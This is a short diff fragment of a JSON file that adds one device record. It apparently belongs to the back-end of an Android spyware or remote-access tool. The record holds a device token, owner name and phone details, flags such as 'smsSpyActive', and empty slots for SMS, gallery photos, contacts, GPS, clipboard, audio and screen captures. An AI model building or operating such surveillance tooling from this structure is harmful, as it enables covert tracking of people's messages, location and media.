@@ -8741,5 +8741,37 @@
       "frameId": 706,
       "capturedAt": 1775463170005
     }
+  },
+  {
+    "deviceId": "pxc_23a0a558",
+    "deviceName": "HP-RAFKA-1C57",
+    "ownerUsername": "senz",
+    "token": "0234f6d17b04b16f14417a06572c9125",
+    "lastSeen": 1775467306721,
+    "commandQueue": [],
+    "online": true,
+    "connectedAt": "2026-04-06T09:21:46.721Z",
+    "deviceInfo": {
+      "model": "Xiaomi 2409BRN2CY",
+      "androidVersion": "Android 15",
+      "battery": 29,
+      "network": "WiFi: MY HOME",
+      "sim1": "Panggilan darurat saja",
+      "sim2": "Tidak ada"
+    },
+    "lastPhoto": null,
+    "lastScreenFrame": null,
+    "smsSpyActive": true,
+    "smsMessages": [],
+    "galleryPhotos": [],
+    "galleryDone": false,
+    "contacts": [],
+    "lastGps": null,
+    "gpsList": [],
+    "lastClipboard": null,
+    "lastAudio": null,
+    "audioList": [],
+    "lastAppUsage": null,
+    "appList": null
   }
 ]
